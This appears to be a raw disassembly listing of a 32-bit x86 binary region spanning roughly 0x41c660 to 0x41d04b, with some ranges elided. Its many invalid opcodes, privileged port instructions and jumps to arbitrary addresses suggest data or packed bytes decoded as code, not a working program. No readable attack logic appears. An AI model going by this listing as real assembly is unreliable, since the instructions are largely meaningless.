  41c660:	sbb    bh,BYTE PTR [ebx-0xb4cf597]
  41c666:	(bad)  
  41c668:	popf   
  41c669:	aad    0x33
  41c66b:	into   
  41c66c:	jb     0x41c6d5
  41c66e:	and    bh,ah
  41c670:	fmul   st,st(2)
  41c672:	push   edi
  41c673:	out    dx,eax
  41c674:	dec    esi
  41c675:	jp     0x41c6c0
  41c677:	pushf  
  41c678:	xchg   DWORD PTR [ebx+0x5c],ebx
  41c67b:	sbb    BYTE PTR [ebx-0x74db839a],ch
  41c681:	adc    dl,BYTE PTR [ebp+0x2928655]
  41c687:	xchg   edx,esi
  41c689:	xchg   ch,bh
  41c68b:	je     0x41c6d6
  41c68d:	cld    
  41c68e:	(bad)  
  41c68f:	push   eax
  41c690:	(bad)  
  41c691:	mov    DWORD PTR [esi+0x62],esi
  41c694:	push   es
  41c695:	sahf   
  41c696:	sub    dh,BYTE PTR [eax]
  41c698:	stos   DWORD PTR es:[edi],eax
  41c699:	push   ebx
  41c69a:	mov    dl,0x57
  41c69c:	rcr    BYTE PTR [ebx+0x64],1
  41c69f:	je     0x41c676
  41c6a1:	xlat   BYTE PTR ds:[ebx]
  41c6a2:	or     BYTE PTR [edx+edx*1+0x44],0x7
  41c6a7:	test   al,0xaa
  41c6a9:	retf   0x6b4b
  41c6ac:	shl    bh,1
  41c6ae:	cmp    al,0xd4
  41c6b0:	jg     0x41c69f
  41c6b2:	jp     0x41c675
  41c6b4:	retf   
	...
  41c715:	add    dl,bl
  41c717:	add    edx,eax
  41c719:	xchg   bl,bl
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	test   eax,0x6af4f67b
  41c727:	sub    al,0x1
  41c729:	add    BYTE PTR [edi],al
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [edi],dh
  41c72f:	adc    BYTE PTR [esi],al
  41c731:	mov    al,ds:0x5b2eb99c
  41c736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c737:	adc    dl,0x6c
  41c73a:	and    al,0x5
  41c73c:	push   0xb
  41c73e:	fidivr WORD PTR [eax+edi*8+0x54]
  41c742:	pop    eax
  41c743:	mov    esp,0xcaf57e84
  41c748:	mul    ah
  41c74a:	fld    TBYTE PTR [edi+0x59]
  41c74d:	mov    ecx,0x560690d2
  41c752:	ins    BYTE PTR es:[edi],dx
  41c753:	std    
  41c754:	pop    ebx
  41c755:	sbb    eax,0xe2e1b8da
  41c75a:	and    eax,0xc2985c08
  41c75f:	mov    ah,0x5e
  41c761:	jbe    0x41c778
  41c763:	int3   
  41c764:	jae    0x41c792
  41c766:	and    BYTE PTR [esi-0x58d2391e],0x9b
  41c76d:	sub    dl,dh
  41c76f:	gs sub al,0x59
  41c772:	ds push es
  41c774:	das    
  41c775:	push   0xf81813d
  41c77a:	xchg   ecx,eax
  41c77b:	jmp    0xe8074295
  41c780:	pop    ebp
  41c781:	sbb    dl,BYTE PTR [esi]
  41c783:	add    al,0x3c
  41c785:	pop    eax
  41c786:	cmp    DWORD PTR ds:0x1bdccb2b,ecx
  41c78c:	push   0xffffffe0
  41c78e:	ffree  st(4)
  41c790:	xchg   esi,eax
  41c791:	repz cmp ch,BYTE PTR [ebx]
  41c794:	in     eax,dx
  41c795:	lods   al,BYTE PTR ds:[esi]
  41c796:	fst    st(4)
  41c798:	ret    
  41c799:	jp     0x41c800
  41c79b:	mov    eax,0x5df90a18
  41c7a0:	int3   
  41c7a1:	cmp    al,0x23
  41c7a3:	out    0xa4,al
  41c7a5:	cdq    
  41c7a6:	ror    bh,0xd
  41c7a9:	nop
  41c7aa:	imul   edx,DWORD PTR [esi],0xa5fb39ae
  41c7b0:	xor    bh,bl
  41c7b2:	jmp    0x2c2a71d3
  41c7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7b8:	aad    0xe4
  41c7ba:	data16 aaa 
  41c7bc:	aam    0x9e
  41c7be:	adc    bl,BYTE PTR [esi]
  41c7c0:	(bad)  
  41c7c1:	mov    eax,0xb8be68a4
  41c7c6:	loopne 0x41c7e5
  41c7c8:	inc    ebx
  41c7c9:	mov    eax,0xf2f6e2b7
  41c7ce:	add    dh,0xcb
  41c7d1:	push   esp
  41c7d2:	scas   al,BYTE PTR es:[edi]
  41c7d3:	or     ch,0x37
  41c7d6:	(bad)  
  41c7d7:	lods   eax,DWORD PTR ds:[esi]
  41c7d8:	jae    0x41c81a
  41c7da:	imul   ebp,DWORD PTR [ecx+0x52],0x3ce59c8f
  41c7e1:	int    0x52
  41c7e3:	je     0x41c7de
  41c7e5:	out    0x19,al
  41c7e7:	sbb    al,0xfd
  41c7e9:	push   esi
  41c7ea:	call   0xa682:0xbd87bea9
  41c7f1:	mov    al,ds:0x95628d3
  41c7f6:	xchg   ecx,eax
  41c7f7:	mov    BYTE PTR [edx-0x12],cl
  41c7fa:	add    DWORD PTR [edx],ebx
  41c7fc:	jl     0x41c7ea
  41c7fe:	popf   
  41c7ff:	mov    al,ds:0xc5e185dc
  41c804:	ret    
  41c805:	fcmovbe st,st(0)
  41c807:	imul   ecx,DWORD PTR [ecx-0x6c],0x4d
  41c80b:	mov    al,ds:0xe8532b87
  41c810:	scas   al,BYTE PTR es:[edi]
  41c811:	daa    
  41c812:	ja     0x41c871
  41c814:	mov    eax,0x26595341
  41c819:	adc    eax,0xe410155
  41c81e:	cld    
  41c81f:	popa   
  41c820:	cmp    DWORD PTR [ebx],esi
  41c822:	and    al,0xda
  41c824:	cli    
  41c825:	mov    ch,0x42
  41c827:	and    BYTE PTR [ebx+0x1b011632],0xac
  41c82e:	dec    ecx
  41c82f:	nop
  41c830:	sub    DWORD PTR [edx+0xf],esi
  41c833:	scas   eax,DWORD PTR es:[edi]
  41c834:	or     al,BYTE PTR [eax]
	...
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	or     eax,0x712f9014
  41c8a7:	sub    eax,0x1070001
  41c8ac:	add    BYTE PTR [eax],al
  41c8ae:	test   DWORD PTR [eax],edi
  41c8b0:	jne    0x41c893
  41c8b2:	lds    eax,FWORD PTR ds:0x2ce09526
  41c8b8:	pandn  mm0,mm6
  41c8bb:	mov    al,ds:0xd0b9c52e
  41c8c0:	and    ebx,edi
  41c8c2:	dec    ebp
  41c8c3:	leave  
  41c8c4:	inc    ebp
  41c8c5:	xlat   BYTE PTR ds:[ebx]
  41c8c6:	and    bh,BYTE PTR [edx]
  41c8c8:	loop   0x41c8ad
  41c8ca:	push   ecx
  41c8cb:	xchg   edi,eax
  41c8cc:	in     eax,dx
  41c8cd:	cmp    esp,DWORD PTR [ecx+ebp*4+0x1b]
  41c8d1:	imul   edx,DWORD PTR [eax+0x5cc31eb9],0x4f44d91d
  41c8db:	sub    dh,BYTE PTR [esi+0x1c]
  41c8de:	mov    BYTE PTR [eax],bh
  41c8e0:	mov    dh,0xe2
  41c8e2:	fadd   DWORD PTR [edx]
  41c8e4:	stos   BYTE PTR es:[edi],al
  41c8e5:	and    esi,DWORD PTR [ecx+eiz*1-0x6b]
  41c8e9:	xchg   BYTE PTR ds:0x6f8ed606,bl
  41c8ef:	inc    ecx
  41c8f0:	and    BYTE PTR [esi+ecx*4+0x2ac5d35f],dh
  41c8f7:	pop    ebx
  41c8f8:	aas    
  41c8f9:	into   
  41c8fa:	lods   al,BYTE PTR ds:[esi]
  41c8fb:	sbb    BYTE PTR [ebx+0x7c],bh
  41c8fe:	mov    dh,0x64
  41c900:	cwde   
  41c901:	loop   0x41c968
  41c903:	jns    0x41c8f3
  41c905:	mov    DWORD PTR [eax-0x66009dbe],ecx
  41c90b:	and    BYTE PTR [ebx+0x64],ah
  41c90e:	or     al,0xbb
  41c910:	(bad)
  41c914:	outs   dx,BYTE PTR ds:[esi]
  41c915:	callw  0xa2a3
  41c919:	test   al,0xdb
  41c91b:	pop    esp
  41c91c:	outs   dx,DWORD PTR ds:[esi]
  41c91d:	jmp    0x41c8bd
  41c91f:	test   eax,0xdfa8e201
  41c924:	out    dx,eax
  41c925:	stc    
  41c926:	jb     0x41c957
  41c928:	mov    eax,0xcaf3ba14
  41c92d:	dec    eax
  41c92e:	push   0x8aae5938
  41c933:	shr    BYTE PTR ds:0x8b59e2d8,cl
  41c939:	cld    
  41c93a:	pop    ebp
  41c93b:	retf   0xe039
  41c93e:	rol    DWORD PTR [edx-0x7df52552],cl
  41c944:	shl    ebx,0x70
  41c947:	aam    0x41
  41c949:	aam    0xef
  41c94b:	xchg   esp,eax
  41c94c:	add    edx,DWORD PTR [ebp-0x72c97376]
  41c952:	ja     0x41c956
  41c954:	push   esp
  41c955:	mov    eax,0x5ffb1e9d
  41c95a:	sub    eax,0xa9baf823
  41c95f:	call   0x241ca7c
  41c964:	fcmovne st,st(6)
  41c966:	sbb    al,0x32
  41c968:	sub    al,0xe2
  41c96a:	mov    edi,DWORD PTR [edx]
  41c96c:	adc    ebx,DWORD PTR ds:0x3600fff2
  41c972:	dec    edx
  41c973:	hlt    
  41c974:	push   es
  41c975:	fucomp st(3)
  41c977:	sub    DWORD PTR [esi+0x7],ecx
  41c97a:	ficomp WORD PTR [ebp-0xf4e3f92]
  41c980:	pusha  
  41c981:	hlt    
  41c982:	sti    
  41c983:	sahf   
  41c984:	and    DWORD PTR [ecx+0x23b65e59],ebp
  41c98a:	shr    eax,0xcd
  41c98d:	lods   eax,DWORD PTR ds:[esi]
  41c98e:	stos   DWORD PTR es:[edi],eax
  41c98f:	hlt    
  41c990:	ins    DWORD PTR es:[edi],dx
  41c991:	push   ds
  41c992:	cwde   
  41c993:	push   0xb5bf0998
  41c998:	add    esi,DWORD PTR [esi-0x6b9b739d]
  41c99e:	inc    esp
  41c99f:	pop    ebx
  41c9a0:	push   eax
  41c9a1:	push   eax
  41c9a2:	popa   
  41c9a3:	jbe    0x41c95e
  41c9a5:	rcr    BYTE PTR [ebx-0x752aa3a9],0x85
  41c9ac:	xor    edx,DWORD PTR [esi+0xa]
  41c9af:	stc    
  41c9b0:	addr16 xchg esi,eax
  41c9b2:	jns    0x41c975
  41c9b4:	dec    eax
	...
  41ca15:	add    al,dh
  41ca17:	retf   0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0xbb63837d
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [edx-0x555c7b7a],ah
  41ca33:	mov    cl,0x93
  41ca35:	aad    0x17
  41ca37:	fs mov al,0x35
  41ca3a:	sub    ch,BYTE PTR [esi]
  41ca3c:	xchg   ebp,eax
  41ca3d:	adc    esp,DWORD PTR [edx-0x41]
  41ca40:	call   0xbeff:0x1af8a1bc
  41ca47:	adc    esp,edi
  41ca49:	sbb    esp,DWORD PTR [eax-0x7f]
  41ca4c:	scas   al,BYTE PTR es:[edi]
  41ca4d:	imul   edx,DWORD PTR [ecx],0xd38f70a7
  41ca53:	cmc    
  41ca54:	and    eax,0xe50e35dd
  41ca59:	pop    ebp
  41ca5a:	inc    ecx
  41ca5b:	test   eax,0x98ef7e02
  41ca60:	dec    esi
  41ca61:	inc    eax
  41ca62:	pop    es
  41ca63:	jne    0x41ca7b
  41ca65:	aad    0x80
  41ca67:	clc    
  41ca68:	pushf  
  41ca69:	fadd   QWORD PTR [ebp+0x68]
  41ca6c:	iret   
  41ca6d:	pop    es
  41ca6e:	es pop esp
  41ca70:	sti    
  41ca71:	rcl    BYTE PTR [esi-0x15],cl
  41ca74:	mov    cs,WORD PTR [ebp-0x4da04a0c]
  41ca7a:	add    eax,0xbbab41d0
  41ca7f:	ffree  st(4)
  41ca81:	dec    eax
  41ca82:	out    dx,eax
  41ca83:	pop    ss
  41ca84:	jb     0x41cafa
  41ca86:	adc    BYTE PTR [edx+0x44b0f9f5],ch
  41ca8c:	imul   ebx,DWORD PTR [esi+ebx*8-0x5e78e212],0x5fdf5e64
  41ca97:	stos   BYTE PTR es:[edi],al
  41ca98:	push   ebp
  41ca99:	xchg   edi,eax
  41ca9a:	cmc    
  41ca9b:	ret    0x7f2c
  41ca9e:	repz in al,dx
  41caa0:	imul   ecx
  41caa2:	jmp    0x41ca54
  41caa4:	sbb    eax,0x5d445541
  41caa9:	mov    dh,0xfb
  41caab:	sbb    al,0x4c
  41caad:	xor    esp,ebp
  41caaf:	(bad)
  41cab3:	dec    ebx
  41cab4:	mov    ebx,DWORD PTR [esi+0x30]
  41cab7:	xchg   BYTE PTR [ecx-0x3185aba5],dl
  41cabd:	pop    ebx
  41cabe:	sub    eax,0xa6f052a9
  41cac3:	mov    al,ds:0xa32f4ffe
  41cac8:	neg    BYTE PTR [eax-0x46]
  41cacb:	xchg   ecx,ebp
  41cacd:	sub    edx,DWORD PTR [ebx+0x2c]
  41cad0:	add    al,0xc
  41cad2:	lods   eax,DWORD PTR ds:[esi]
  41cad3:	xchg   ecx,eax
  41cad4:	adc    al,0x56
  41cad6:	daa    
  41cad7:	and    BYTE PTR [esi+0x26bf6cb9],ch
  41cadd:	push   edi
  41cade:	call   0xa7e76c6
  41cae3:	call   0x78c4:0x1b8e7e5e
  41caea:	nop
  41caeb:	cmp    al,0xae
  41caed:	sub    edi,DWORD PTR [ebp+0x22c660eb]
  41caf3:	ret    
  41caf4:	mov    es,WORD PTR [esi]
  41caf6:	xor    ecx,DWORD PTR [esi+0x32]
  41caf9:	xchg   edx,eax
  41cafa:	push   ss
  41cafb:	cwde   
  41cafc:	ret    0xf601
  41caff:	(bad)  
  41cb00:	sti    
  41cb01:	xor    ecx,ebp
  41cb03:	cdq    
  41cb04:	fisttp WORD PTR [esi]
  41cb06:	adc    BYTE PTR [ebx+0x13],cl
  41cb09:	mov    es,WORD PTR [ebp+0x47ec597f]
  41cb0f:	inc    esi
  41cb10:	lds    esp,FWORD PTR [ebx-0x54]
  41cb13:	mov    eax,ds:0x82314a82
  41cb18:	call   0xafff9d1d
  41cb1d:	in     eax,dx
  41cb1e:	mov    ah,0x6c
  41cb20:	inc    esi
  41cb21:	pop    ds
  41cb22:	or     BYTE PTR [ecx+0x3b],dh
  41cb25:	je     0x41cb08
  41cb27:	in     eax,0x32
  41cb29:	push   ss
  41cb2a:	shl    BYTE PTR [edi+0x53e2e9c],cl
  41cb30:	push   ss
  41cb31:	sub    edi,DWORD PTR [eax+0xb687]
	...
  41cb93:	add    BYTE PTR [eax],al
  41cb95:	add    BYTE PTR [ecx],ch
  41cb97:	(bad)  
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi+0x7ec23c4c]
  41cba3:	mov    esi,0x2f7f557c
  41cba8:	add    DWORD PTR [eax],eax
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    BYTE PTR [ebx-0x4a],ah
  41cbb0:	(bad)  
  41cbb1:	stos   DWORD PTR es:[edi],eax
  41cbb2:	push   ds
  41cbb3:	sti    
  41cbb4:	add    eax,0xc9838cc7
  41cbb9:	mov    cl,0xd
  41cbbb:	fimul  DWORD PTR [edx+0xafb9816]
  41cbc1:	imul   edi,DWORD PTR ds:0xb791be66,0xdea13419
  41cbcb:	out    dx,al
  41cbcc:	aaa    
  41cbcd:	push   ecx
  41cbce:	and    esp,DWORD PTR [eax+ebp*8]
  41cbd1:	ret    
  41cbd2:	inc    eax
  41cbd3:	mov    ecx,0xeb8c4c76
  41cbd8:	xor    esp,0x51
  41cbdb:	inc    esi
  41cbdc:	popf   
  41cbdd:	test   eax,0xd15bcfcd
  41cbe2:	xchg   ebp,eax
  41cbe3:	scas   eax,DWORD PTR es:[edi]
  41cbe4:	test   eax,0xb013bc5a
  41cbe9:	daa    
  41cbea:	mov    eax,ds:0x6645517d
  41cbef:	call   0x98c7e7ae
  41cbf4:	xor    cl,BYTE PTR [ecx-0x55]
  41cbf7:	lods   eax,DWORD PTR ds:[esi]
  41cbf8:	retf   0xdd7a
  41cbfb:	in     al,dx
  41cbfc:	mov    es,WORD PTR [edi+0x40]
  41cbff:	out    dx,eax
  41cc00:	ror    DWORD PTR [ecx+0x66474255],1
  41cc06:	xchg   ebp,esi
  41cc08:	or     eax,0x4c65678d
  41cc0d:	hlt    
  41cc0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc0f:	sub    BYTE PTR [edx+eiz*1],0xf7
  41cc13:	icebp  
  41cc14:	add    ah,cl
  41cc16:	xchg   esp,eax
  41cc17:	scas   eax,DWORD PTR es:[edi]
  41cc18:	sbb    eax,0xe92e6a7b
  41cc1d:	int3   
  41cc1e:	pop    ss
  41cc1f:	iret   
  41cc20:	add    BYTE PTR ds:0x13b4844f,cl
  41cc26:	sbb    bl,BYTE PTR [eax+0x1]
  41cc29:	and    DWORD PTR [edx-0x29],ebp
  41cc2c:	add    al,0x9c
  41cc2e:	push   ds
  41cc2f:	mul    DWORD PTR [eax+0x3f6e5381]
  41cc35:	loopne 0x41cbe5
  41cc37:	dec    esp
  41cc38:	dec    esp
  41cc39:	pop    ebx
  41cc3a:	aas    
  41cc3b:	pop    ds
  41cc3c:	push   0xffffffb3
  41cc3e:	and    DWORD PTR [eax-0x7],ebp
  41cc41:	retf   
  41cc42:	addr16 iret 
  41cc44:	arpl   WORD PTR [ebx-0x5e],dx
  41cc47:	push   ebp
  41cc48:	cdq    
  41cc49:	pop    edx
  41cc4a:	inc    eax
  41cc4b:	in     eax,0xc5
  41cc4d:	fadd   DWORD PTR [ecx-0x5e]
  41cc50:	out    dx,eax
  41cc51:	(bad)  
  41cc53:	icebp  
  41cc54:	push   edi
  41cc55:	bound  ebp,QWORD PTR [esi]
  41cc57:	and    edx,DWORD PTR [ecx-0x12101030]
  41cc5d:	cmp    DWORD PTR [ecx-0x58ca7998],ebp
  41cc63:	adc    eax,0xc5313376
  41cc68:	xchg   esi,eax
  41cc69:	(bad)  
  41cc6a:	mov    bh,0xd3
  41cc6c:	push   0xec244a55
  41cc71:	xor    al,0xee
  41cc73:	scas   al,BYTE PTR es:[edi]
  41cc74:	out    dx,al
  41cc75:	pop    edx
  41cc76:	jmp    0xc7f7:0xb662b0df
  41cc7d:	cmp    esi,esi
  41cc7f:	imul   esi,DWORD PTR [eax],0x13
  41cc82:	xor    DWORD PTR [edx],ecx
  41cc84:	pop    edx
  41cc85:	sbb    BYTE PTR [esi-0x1971750b],dh
  41cc8b:	or     BYTE PTR [edx],ah
  41cc8d:	jbe    0x41cc36
  41cc8f:	(bad)  
  41cc90:	and    ah,BYTE PTR [ebx]
  41cc92:	rcr    DWORD PTR [eax-0x79],1
  41cc95:	mov    dh,0x7f
  41cc97:	mov    esp,0xc58907e8
  41cc9c:	sub    edi,DWORD PTR [edi+edi*1+0x30]
  41cca0:	int    0xba
  41cca2:	sub    ah,al
  41cca4:	jmp    0x6966595
  41cca9:	test   eax,0x9b94444f
  41ccae:	lods   eax,DWORD PTR ds:[esi]
  41ccaf:	dec    esi
  41ccb0:	test   DWORD PTR [edi],ebp
  41ccb2:	mul    dl
  41ccb4:	in     al,dx
	...
  41cd15:	add    BYTE PTR [eax-0x67],ah
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	mov    BYTE PTR fs:[edx+0x130862f],ch
  41cd29:	add    BYTE PTR [edi],al
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    BYTE PTR [eax],bl
  41cd2f:	inc    esi
  41cd30:	iret   
  41cd31:	stc    
  41cd32:	mov    dh,0xde
  41cd34:	arpl   WORD PTR [eax-0x77],bp
  41cd37:	ficom  WORD PTR ds:0x51165010
  41cd3d:	pop    esp
  41cd3e:	inc    eax
  41cd3f:	int3   
  41cd40:	sbb    eax,0xc7a8bfd6
  41cd45:	and    esi,DWORD PTR [ecx+edi*8]
  41cd48:	int3   
  41cd49:	cmp    BYTE PTR [edx-0x76],dh
  41cd4c:	icebp  
  41cd4d:	mov    dh,0x44
  41cd4f:	or     ebx,edx
  41cd51:	dec    ecx
  41cd52:	push   cs
  41cd53:	(bad)  
  41cd54:	push   ds
  41cd55:	aas    
  41cd56:	pop    eax
  41cd57:	inc    edi
  41cd58:	(bad)  
  41cd59:	cmp    DWORD PTR ds:0xd8216e8f,eax
  41cd5f:	aas    
  41cd60:	jle    0x41cd53
  41cd62:	mov    bh,0x8b
  41cd64:	add    ebp,DWORD PTR [edx-0x41d046ea]
  41cd6a:	scas   eax,DWORD PTR es:[edi]
  41cd6b:	sub    dh,BYTE PTR [edi-0x1e46842c]
  41cd71:	add    DWORD PTR [ebp+0x2e],ebp
  41cd74:	icebp  
  41cd75:	pushf  
  41cd76:	cld    
  41cd77:	jns    0x41cdcc
  41cd79:	pop    edx
  41cd7a:	push   ebx
  41cd7b:	int3   
  41cd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd7d:	and    ebx,ebx
  41cd7f:	push   0x654a7f5e
  41cd84:	mov    BYTE PTR [esi+0x59db2426],cl
  41cd8a:	in     eax,0x71
  41cd8c:	mov    ds:0x2a166cdb,eax
  41cd91:	dec    edi
  41cd92:	push   esi
  41cd93:	or     dl,BYTE PTR [ecx]
  41cd95:	repz shl DWORD PTR [edx+0x54],cl
  41cd99:	dec    ebx
  41cd9a:	push   esi
  41cd9b:	daa    
  41cd9c:	lods   al,BYTE PTR ds:[esi]
  41cd9d:	xchg   ecx,eax
  41cd9e:	iret   
  41cd9f:	sti    
  41cda0:	inc    ebp
  41cda1:	push   esi
  41cda2:	xchg   ebx,eax
  41cda3:	adc    ecx,DWORD PTR [edx+0x10c9a777]
  41cda9:	aad    0x1c
  41cdab:	sbb    ecx,DWORD PTR [edx*1+0x31f43189]
  41cdb2:	xchg   esp,ebx
  41cdb4:	rcl    BYTE PTR [ebx-0x3aff6674],cl
  41cdba:	push   0xffffffcc
  41cdbc:	lock dec ebp
  41cdbe:	or     eax,0x7a6902ab
  41cdc3:	xchg   ecx,eax
  41cdc4:	outs   dx,BYTE PTR ds:[esi]
  41cdc5:	and    eax,0xd5e71311
  41cdca:	xchg   ebx,eax
  41cdcb:	pop    edi
  41cdcc:	outs   dx,BYTE PTR ds:[esi]
  41cdcd:	adc    DWORD PTR [edx-0x3660789e],ecx
  41cdd3:	out    dx,al
  41cdd4:	xor    BYTE PTR [ecx+edx*1+0x31382346],al
  41cddb:	in     al,dx
  41cddc:	pop    edx
  41cddd:	pop    esi
  41cdde:	sahf   
  41cddf:	xchg   ecx,eax
  41cde0:	test   eax,0x939d2b39
  41cde5:	inc    eax
  41cde6:	adc    DWORD PTR [edx],ecx
  41cde8:	mov    ch,0xa2
  41cdea:	or     BYTE PTR [eax+0x53c8ba19],ah
  41cdf0:	test   DWORD PTR [ebx-0x1a],0xb6e44734
  41cdf7:	sbb    ecx,DWORD PTR [eax+0x7b]
  41cdfa:	add    ebx,DWORD PTR ds:0x9fe4cf79
  41ce00:	mov    edx,0x30c8f6cd
  41ce05:	test   eax,0xdcb5c1a0
  41ce0a:	retf   0x8bf8
  41ce0d:	jg     0x41ce26
  41ce0f:	mov    ds:0x25ba75ac,al
  41ce14:	into   
  41ce15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce16:	int    0x67
  41ce18:	inc    esp
  41ce19:	test   bl,bl
  41ce1b:	sub    DWORD PTR [esi],eax
  41ce1d:	push   edi
  41ce1e:	mov    esi,edi
  41ce20:	jbe    0x41ce6c
  41ce22:	sbb    dh,bl
  41ce24:	xchg   ebx,eax
  41ce25:	adc    BYTE PTR [esi+0x34c688e],0x77
  41ce2c:	mov    ds:0xf16efa36,eax
  41ce31:	push   0xffffffb5
  41ce33:	add    ebx,DWORD PTR [eax]
	...
  41ce95:	add    BYTE PTR [edi],al
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0xe546fd77
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [edi],bh
  41ceaf:	cs int 0x48
  41ceb2:	fist   WORD PTR [edi]
  41ceb4:	int    0xf3
  41ceb6:	adc    al,0x59
  41ceb8:	mov    cs,WORD PTR [edx]
  41ceba:	out    dx,eax
  41cebb:	and    al,0xfa
  41cebd:	mov    ebp,0x688c235f
  41cec2:	shl    BYTE PTR [ebp+0x12],1
  41cec5:	mov    al,0x7b
  41cec7:	nop
  41cec8:	or     DWORD PTR [esi+0x477f0cc8],edx
  41cece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cecf:	arpl   si,bx
  41ced1:	loopne 0x41cf33
  41ced3:	sub    cl,ch
  41ced5:	(bad)  
  41ced6:	and    eax,0xca8a7be4
  41cedb:	or     DWORD PTR [edx],0x9909f7b5
  41cee1:	mov    edi,0xbd26347
  41cee6:	jne    0x41cf5e
  41cee8:	sub    DWORD PTR [eax+0x199f1990],0x1b
  41ceef:	nop    DWORD PTR [ebx-0x15]
  41cef3:	pop    eax
  41cef4:	repnz xlat BYTE PTR ds:[ebx]
  41cef6:	aam    0x16
  41cef8:	pushf  
  41cef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cefa:	or     al,0xd1
  41cefc:	xchg   edi,eax
  41cefd:	dec    esp
  41cefe:	fst    DWORD PTR [esi-0x5b5b6add]
  41cf04:	inc    esp
  41cf05:	add    bh,bl
  41cf07:	xor    edx,ecx
  41cf09:	rol    BYTE PTR [ebx-0x42],1
  41cf0c:	cmp    eax,0xa04f6fbb
  41cf11:	sahf   
  41cf12:	in     al,dx
  41cf13:	out    dx,ax
  41cf15:	sbb    al,0xc4
  41cf17:	jmp    0xe8521312
  41cf1c:	inc    ebp
  41cf1d:	jmp    0x41ced1
  41cf1f:	inc    esi
  41cf20:	dec    edi
  41cf21:	mov    ebp,?
  41cf23:	fdiv   DWORD PTR [ecx-0x1753be1f]
  41cf29:	mov    al,ds:0xf8be0c14
  41cf2e:	xchg   BYTE PTR [eax+0x5b],ah
  41cf31:	es mov esp,0x8730bd2e
  41cf37:	jb     0x41cf48
  41cf39:	add    DWORD PTR [edx+edi*1+0x349758c7],ebp
  41cf40:	dec    esi
  41cf41:	push   ebp
  41cf42:	cmp    al,0xd3
  41cf44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf45:	jne    0x41cf91
  41cf47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf48:	xor    eax,0x804de059
  41cf4d:	lods   eax,DWORD PTR ds:[esi]
  41cf4e:	fsubr  DWORD PTR [esi+0x50]
  41cf51:	dec    ecx
  41cf52:	jne    0x41cf71
  41cf54:	xor    BYTE PTR [esi],ah
  41cf56:	pop    ecx
  41cf57:	mov    ebx,0xfed0c7e9
  41cf5c:	mov    al,0x34
  41cf5e:	jb     0x41cf66
  41cf60:	xchg   ebx,eax
  41cf61:	sbb    al,0xfe
  41cf63:	test   bh,0xc6
  41cf66:	push   edx
  41cf67:	add    BYTE PTR [ecx+0x77],ah
  41cf6a:	xor    ebp,DWORD PTR [edi]
  41cf6c:	mov    ebp,0x80173935
  41cf71:	fisttp WORD PTR [eax]
  41cf73:	sbb    al,0xdc
  41cf75:	(bad)  
  41cf76:	or     cl,BYTE PTR [eax+0x1b]
  41cf79:	sub    BYTE PTR [esi+0x62],cl
  41cf7c:	aas    
  41cf7d:	frstor [ebp+0xe4610c0]
  41cf83:	mov    ebx,0xd2112cb5
  41cf88:	or     ecx,DWORD PTR [edx]
  41cf8a:	adc    al,0xd9
  41cf8c:	loop   0x41cf6b
  41cf8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf8f:	cs loopne 0x41cfd2
  41cf92:	fild   WORD PTR [eax]
  41cf94:	mov    BYTE PTR [ebp+ecx*1-0x2b],0xe9
  41cf99:	das    
  41cf9a:	mov    eax,ds:0xc723fdb
  41cf9f:	adc    al,BYTE PTR [ecx+0x22]
  41cfa2:	gs into 
  41cfa4:	out    0xe1,eax
  41cfa6:	aam    0xec
  41cfa8:	lahf   
  41cfa9:	sbb    ebp,ecx
  41cfab:	pop    esp
  41cfac:	aad    0x10
  41cfae:	int3   
  41cfaf:	inc    esi
  41cfb0:	inc    esi
  41cfb1:	ret    
  41cfb2:	adc    DWORD PTR [ebp+0x2c],ebx
	...
  41d015:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	jle    0x41cfac
  41d024:	(bad)  
  41d025:	mov    WORD PTR [edx+esi*1+0x1070001],ss
  41d02c:	add    BYTE PTR [eax],al
  41d02e:	shl    BYTE PTR [esp+esi*8],cl
  41d031:	jge    0x41d073
  41d033:	cmp    eax,0x38ef8414
  41d038:	out    0x4e,eax
  41d03a:	and    al,0x90
  41d03c:	sti    
  41d03d:	rol    DWORD PTR [ebx+eax*1-0xcf8c06d],1
  41d044:	sub    bl,al
  41d046:	push   esp
  41d047:	ffree  st(0)
  41d049:	mov    es,WORD PTR [ebx]
  41d04b:	push   ecx
